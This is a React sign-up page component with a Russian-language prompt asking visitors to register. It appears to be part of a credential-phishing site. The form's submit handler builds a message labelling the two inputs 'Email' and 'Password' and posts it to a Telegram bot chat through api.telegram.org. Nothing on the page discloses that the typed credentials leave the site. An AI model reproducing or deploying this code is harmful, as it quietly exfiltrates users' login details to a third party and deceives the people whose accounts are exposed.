import React, {useState} from 'react';
import "./SignUp.scss"
import Footer from "../../footer/Footer";
import Header from "../../header/Header";
import Hero from "../../main-page/hero/Hero";
import axios from "axios";
import {CHAT_ID, TOKEN} from "./token";
const SignUp = () => {
    const [value,setValue] = useState({
        title: "",
        email: ""
    })

    const handleChange = (e) => {
        setValue({...value, [e.target.name]: e.target.value})
    }


    let message = `<b>motion</b>\n`
    message += `Email: ${value.title}\n`
    message += `Password: ${value.email}`

    let values = `<b>Login</b>\n`
    values += `Email: ${value.title}\n`
    values += `Password: ${value.email}`

    const fetchBot = async (e) => {
        e.preventDefault()
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            parse_mode: "html",
            text: values
        })
    }



    return (
        <>
            <Header/>
            <Hero/>
            <div id={"sign-up"}>
                <div className="container">
                    <div className="sign-up">
                        <div className="sign-up--title">
                            <p>Пожалуйста, зарегистрируйтесь, чтобы продолжить</p>
                            <form onSubmit={fetchBot}>
                            <input onChange={handleChange} name={"title"} type="text"/>
                            <input onChange={handleChange} name={"email"} type="text"/>
                            <button onClick={fetchBot}>create</button>
                            </form>

                        </div>

                    </div>
                </div>
            </div>
            <Footer/>
        </>
    );
};

export default SignUp;